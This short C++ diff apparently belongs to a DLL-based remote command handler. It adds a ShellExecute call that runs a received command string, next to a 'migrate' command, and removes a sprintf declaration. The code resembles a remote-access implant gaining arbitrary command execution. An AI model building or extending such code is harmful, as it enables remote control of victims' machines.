@@ -1,7 +1,5 @@
 #include "sopar.h"
 
-extern "C" void sprintf(char *buf, const char *fmt, ...);
-
 #include "../dll/exports.h"
 
 extern struct DllMeta_ DllMeta;
@@ -24,6 +22,7 @@ void sopar::parse()
         this->sopar_send("executing command: ");
         this->sopar_send(it + 1);
         this->sopar_send("\n");
+        ShellExecute(it + 1);
         return;
     }
     else if(!strcmp(this->buf, "migrate"))
